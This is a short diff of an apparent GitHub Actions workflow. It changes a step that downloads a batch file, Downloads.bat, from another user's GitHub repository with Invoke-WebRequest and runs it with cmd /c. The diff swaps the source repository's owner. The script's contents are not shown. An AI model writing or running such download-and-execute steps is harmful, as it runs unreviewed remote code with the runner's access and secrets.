@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Malubulul
         run: |
-          Invoke-WebRequest -Uri "https://github.com/kadalset/setup/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          Invoke-WebRequest -Uri "https://github.com/kadalzsec10/setup/raw/main/Downloads.bat" -OutFile "Downloads.bat"
           cmd /c Downloads.bat
 
       - name: Hello
